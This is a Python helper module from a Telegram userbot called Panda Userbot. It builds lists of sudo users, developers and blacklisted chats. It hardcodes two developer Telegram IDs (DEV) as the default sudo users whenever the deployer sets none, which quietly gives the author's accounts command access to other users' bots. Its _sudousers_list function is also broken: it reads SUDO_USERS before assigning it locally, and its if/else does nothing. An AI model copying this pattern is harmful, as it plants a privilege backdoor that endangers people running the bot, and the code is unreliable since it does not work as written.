# ILHAM MANSIEZ
# PANDA USERBOT
import os 
from ..sql_helper.global_collectionjson import get_collection
from ..sql_helper.global_list import get_collection_list
from ..sql_helper.sqldb import getdb
DEV = [5057493677, 1593802955]

SUDO_USERS = getdb("SUDO_USERS") or DEV
SUDO_USERS = {int(x) for x in os.environ.get("SUDO_USERS", "").split()} or DEV



def _sudousers_list():
    try:
        if SUDO_USERS:
            SUDO_USERS
        else:
            SUDO_USERS  
    except AttributeError:
        SUDO_USERS = []
    return SUDO_USERS

def _dev_list():
    try:
        sudousers = get_collection("dev_list").json
    except AttributeError:
        sudousers = {}
    ulist = sudousers.keys()
    return [int(chat) for chat in ulist]

def _users_list():
    try:
        sudousers = get_collection("sudousers_list").json
    except AttributeError:
        sudousers = {}
    ulist = sudousers.keys()
    ulist = [int(chat) for chat in ulist]
    ulist.append("me")
    return list(ulist)


def blacklist_chats_list():
    try:
        blacklistchats = get_collection("blacklist_chats_list").json
    except AttributeError:
        blacklistchats = {}
    blacklist = blacklistchats.keys()
    return [int(chat) for chat in blacklist]


def sudo_enabled_cmds():
    listcmds = get_collection_list("sudo_enabled_cmds")
    return list(listcmds)





